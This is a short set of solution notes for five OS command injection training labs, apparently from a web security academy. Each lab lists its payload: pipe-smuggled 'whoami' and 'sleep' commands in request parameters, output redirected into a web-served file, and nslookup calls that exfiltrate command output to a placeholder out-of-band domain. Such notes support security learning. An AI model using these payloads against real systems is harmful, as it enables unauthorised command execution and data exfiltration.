# OS Command Injection Labs

## Lab: OS command injection, simple case

### Exploitation

```text
productId=12|whoami|&storeId=3
```

---

## Lab: Blind OS command injection with time delays

### Exploitation

Parameter: `email`

```text
|sleep+10|
```

---

## Lab: Blind OS command injection with output redirection

### Exploitation

Parameter: `email`

```text
|whoami+>+/var/www/images/whoami.txt|
```

---

## Lab: Blind OS command injection with out-of-band interaction

### Exploitation

```text
|nslookup+`COLLABORATOR`|
```

---

## Lab: Blind OS command injection with out-of-band data exfiltration

### Exploitation

```text
|nslookup+`whoami`.SUBDOMAIN||
```
